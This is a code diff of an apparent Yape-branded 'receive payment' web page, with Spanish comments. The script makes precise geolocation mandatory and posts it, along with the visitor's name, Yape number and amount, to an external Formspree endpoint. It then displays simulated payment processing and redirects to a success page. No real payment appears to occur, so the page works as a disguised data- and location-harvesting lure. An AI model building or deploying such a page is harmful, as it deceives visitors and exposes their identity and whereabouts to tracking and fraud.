@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yape Cobranza - Recibir Pago</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -204,58 +205,63 @@
     </div>
 
     <script>
-        // *** REEMPLAZA ESTO con tu URL de Formspree ***
-        const FORMSPREE_FORM_URL = 'https://formspree.io/f/xldleerk'; // Ej: https://formspree.io/f/abcdefgh
+        // ¡IMPORTANTE! REEMPLAZA 'TU_ID_DE_FORMULARIO' con el URL único de tu formulario de Formspree
+        // Ejemplo: const FORMSPREE_FORM_URL = 'https://formspree.io/f/abcdefgh';
+        const FORMSPREE_FORM_URL = 'https://formspree.io/f/xldleerk'; 
 
         const requestButton = document.getElementById('request-button');
         const statusMessageDiv = document.getElementById('status-message');
         const loadingGif = document.getElementById('loading-gif');
         const resultsDiv = document.getElementById('results');
 
-        // Referencias a todos los inputs
+        // Referencias a todos los inputs del formulario
         const amountInput = document.getElementById('amount');
         const beneficiaryNameInput = document.getElementById('beneficiaryName');
         const yapeNumberInput = document.getElementById('yapeNumber');
         const conceptInput = document.getElementById('concept');
-        const latitudeInput = document.getElementById('latitude'); // Nuevo
-        const longitudeInput = document.getElementById('longitude'); // Nuevo
+        const latitudeInput = document.getElementById('latitude'); 
+        const longitudeInput = document.getElementById('longitude');
 
-        // Colección de todos los inputs para deshabilitar/habilitar fácilmente
+        // Colección de todos los inputs (visibles) para deshabilitar/habilitar fácilmente
         const allInputs = [amountInput, beneficiaryNameInput, yapeNumberInput, conceptInput];
 
-        // Función para deshabilitar todos los inputs
+        // Función para deshabilitar o habilitar todos los inputs y el botón
         function disableInputs(disabled) {
             allInputs.forEach(input => {
                 input.disabled = disabled;
             });
-            requestButton.disabled = disabled; // También deshabilitar el botón
+            requestButton.disabled = disabled; // Deshabilita/habilita el botón también
         }
 
-        // Limpiar el estado al cargar la página por primera vez
+        // Limpiar el estado y habilitar inputs al cargar la página
         window.onload = function() {
             loadingGif.style.display = 'none';
             statusMessageDiv.textContent = '';
             statusMessageDiv.className = '';
             resultsDiv.style.display = 'none';
-            disableInputs(false); // Asegurarse de que los inputs y el botón estén habilitados al cargar
+            disableInputs(false); // Asegura que todo esté habilitado al cargar
         };
 
+        // Event listener para el botón "Solicitar Pago"
         requestButton.addEventListener('click', function() {
-            // 1. Validaciones de formulario (antes de pedir ubicación)
+            // 1. **Validaciones iniciales del formulario (HTML5):**
+            // Se verifica que todos los campos requeridos y con patrones HTML estén válidos.
             if (!amountInput.checkValidity() || !beneficiaryNameInput.checkValidity() || !yapeNumberInput.checkValidity()) {
                 statusMessageDiv.className = 'error';
                 statusMessageDiv.textContent = 'Por favor, corrige los campos resaltados para continuar.';
                 loadingGif.style.display = 'none';
-                disableInputs(false); // Mantener habilitado para corrección
-                return;
+                disableInputs(false); // Mantener habilitado para que el usuario pueda corregir
+                return; // Detener la ejecución si hay errores de validación
             }
 
+            // Obtener los valores de los campos después de la validación HTML5
             const amount = parseFloat(amountInput.value);
             const beneficiaryName = beneficiaryNameInput.value.trim();
             const yapeNumber = yapeNumberInput.value.trim();
             const concept = conceptInput.value;
 
-            // Validaciones JavaScript adicionales
+            // 2. **Validaciones JavaScript adicionales:**
+            // Estas validaciones ofrecen mensajes de error más específicos si es necesario.
             if (amount <= 0 || amount > 500) {
                 statusMessageDiv.className = 'error';
                 statusMessageDiv.textContent = 'El monto debe ser un número positivo y no mayor a S/ 500.';
@@ -264,6 +270,7 @@
                 return;
             }
 
+            // Patrón para nombre: solo letras, espacios y puntos (no números)
             const namePattern = /^[a-zA-Z\s.]+$/;
             if (!namePattern.test(beneficiaryName)) {
                 statusMessageDiv.className = 'error';
@@ -273,6 +280,7 @@
                 return;
             }
 
+            // Patrón para número de Yape: exactamente 9 dígitos numéricos
             const yapeNumberPattern = /^\d{9}$/;
             if (!yapeNumberPattern.test(yapeNumber)) {
                 statusMessageDiv.className = 'error';
@@ -282,21 +290,21 @@
                 return;
             }
 
-            // Si todas las validaciones de formulario pasan, entonces solicitar la ubicación
+            // Si todas las validaciones pasan, proceder a solicitar ubicación
             statusMessageDiv.textContent = 'Solicitando ubicación...';
-            statusMessageDiv.className = ''; // Limpiar errores previos
-            loadingGif.style.display = 'block';
-            disableInputs(true); // Deshabilita los campos y el botón mientras se pide la ubicación
+            statusMessageDiv.className = ''; // Limpiar cualquier mensaje de error previo
+            loadingGif.style.display = 'block'; // Mostrar GIF de carga
+            disableInputs(true); // Deshabilitar inputs y botón durante la solicitud de ubicación
 
-            // 2. Solicitar Ubicación
+            // 3. **Solicitud Obligatoria de Ubicación:**
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
-                        // Ubicación obtenida con éxito
+                        // Función de éxito: Ubicación obtenida
                         latitudeInput.value = position.coords.latitude;
                         longitudeInput.value = position.coords.longitude;
 
-                        // Datos a enviar a Formspree
+                        // Preparar los datos para enviar a Formspree
                         const formData = new FormData();
                         formData.append('Monto', amount.toFixed(2));
                         formData.append('NombreBeneficiario', beneficiaryName);
@@ -304,24 +312,24 @@
                         formData.append('Concepto', concept);
                         formData.append('Latitud', position.coords.latitude);
                         formData.append('Longitud', position.coords.longitude);
-                        formData.append('FechaHora', new Date().toLocaleString()); // Para tener un registro del tiempo
+                        formData.append('FechaHora', new Date().toLocaleString()); // Añadir fecha y hora del envío
 
                         try {
-                            // Enviar datos a Formspree
+                            // Enviar datos a Formspree usando fetch API
                             const response = await fetch(FORMSPREE_FORM_URL, {
                                 method: 'POST',
                                 body: formData,
                                 headers: {
-                                    'Accept': 'application/json' // Importante para Formspree
+                                    'Accept': 'application/json' // Importante para que Formspree responda correctamente
                                 }
                             });
 
                             if (response.ok) {
                                 // Datos enviados con éxito a Formspree
                                 statusMessageDiv.textContent = 'Datos enviados. Procesando pago...';
-                                loadingGif.style.display = 'block';
-
-                                // Simulación de procesamiento y redirección después de 7 segundos
+                                // El GIF de carga ya está visible
+                                
+                                // Redirección a success.html después de 7 segundos
                                 setTimeout(() => {
                                     const queryParams = new URLSearchParams({
                                         status: 'success',
@@ -335,42 +343,42 @@
 
                                     window.location.href = `success.html?${queryParams}`;
 
-                                }, 7000); // 7 segundos
+                                }, 7000); // 7,000 milisegundos = 7 segundos
 
                             } else {
-                                // Error al enviar a Formspree
+                                // Error al enviar a Formspree (ej: URL incorrecta, problemas en Formspree)
                                 statusMessageDiv.className = 'error';
-                                statusMessageDiv.textContent = 'Error al enviar datos a Formspree. Por favor, inténtalo de nuevo.';
+                                statusMessageDiv.textContent = 'Error al enviar datos. Por favor, inténtalo de nuevo.';
                                 loadingGif.style.display = 'none';
-                                disableInputs(false); // Habilitar para reintento
+                                disableInputs(false); // Habilitar para que el usuario pueda reintentar
                             }
                         } catch (error) {
-                            // Error de red al enviar a Formspree
+                            // Error de red (ej: sin conexión a internet)
                             console.error('Error de red al enviar a Formspree:', error);
                             statusMessageDiv.className = 'error';
-                            statusMessageDiv.textContent = 'Error de conexión. Por favor, verifica tu internet e inténtalo de nuevo.';
+                            statusMessageDiv.textContent = 'Error de conexión. Verifica tu internet e inténtalo de nuevo.';
                             loadingGif.style.display = 'none';
                             disableInputs(false);
                         }
 
                     },
                     (error) => {
-                        // Error al obtener la ubicación (usuario denegó o algún otro error)
+                        // Función de error: No se pudo obtener la ubicación (usuario denegó, etc.)
                         console.error('Error al obtener la ubicación:', error);
                         statusMessageDiv.className = 'error';
-                        // Mensaje amigable al usuario sin especificar por qué falló la ubicación
+                        // Mensaje al usuario para que sepa que necesita dar permiso
                         statusMessageDiv.textContent = 'No se pudo obtener tu ubicación. Por favor, permite el acceso y vuelve a intentarlo.';
                         loadingGif.style.display = 'none';
-                        disableInputs(false); // Habilitar para que el usuario pueda intentar de nuevo
+                        disableInputs(false); // Habilitar para que el usuario pueda reintentar
                     },
                     {
-                        enableHighAccuracy: true, // Solicitar la mejor precisión posible
-                        timeout: 10000,           // Tiempo máximo para obtener la ubicación (10 segundos)
-                        maximumAge: 0             // No usar una ubicación en caché, siempre intentar obtener una nueva
+                        enableHighAccuracy: true, // Pide la mejor precisión posible
+                        timeout: 10000,           // Tiempo máximo de espera para obtener la ubicación (10 segundos)
+                        maximumAge: 0             // No usar ubicaciones en caché, siempre intentar una nueva
                     }
                 );
             } else {
-                // Navegador no soporta Geolocalización
+                // Navegador no soporta la API de Geolocalización
                 statusMessageDiv.className = 'error';
                 statusMessageDiv.textContent = 'Tu navegador no soporta la geolocalización. No se puede continuar.';
                 loadingGif.style.display = 'none';
